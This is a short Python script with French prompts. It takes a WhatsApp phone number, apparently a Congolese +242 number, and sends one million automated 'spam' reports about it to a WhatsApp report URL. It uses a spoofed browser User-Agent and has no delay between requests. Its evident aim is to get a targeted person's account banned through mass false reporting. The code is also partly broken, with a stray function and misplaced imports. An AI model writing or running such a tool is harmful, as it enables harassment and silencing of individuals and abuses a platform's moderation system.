def run_script():
    print("Ton script démarre ici")

    import time
import requests

def main():
    numero = input("Entrez le numéro WhatsApp : (+242) 10 20 50 70 - ex 100 200 500 700 ou (242) 1020 50570 ")
    
    print("\nTraitement en cours...")
    print(f"Numéro saisi : {numero}")
    
    # Simuler un numéro 242xxxxxxx
    numero_simule = numero.replace("(242)", "+242").replace("(", "").replace(")", "")
    
    # Simulation d'action
    for _ in range(1000000):
        # Envoyer le signalement via API WhatsApp
        url = "https://www.whatsapp.com/ldp/report"
        data = {
            "phone": numero_simule,
            "report_type": "spam"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        try:
            response = requests.post(url, data=data, headers=headers)
            if response.status_code == 200:
                print(f"Succès pour le numéro {numero_simule}")
            else:
                print(f"Erreur pour le numéro {numero_simule} : {response.text}")
        except Exception as e:
            print(f"Erreur pour le numéro {numero_simule} : {e}")
        
        print(f"Signalement envoyé pour {numero_simule}")
        # time.sleep(0.001)

if __name__ == "__main__":
    main()
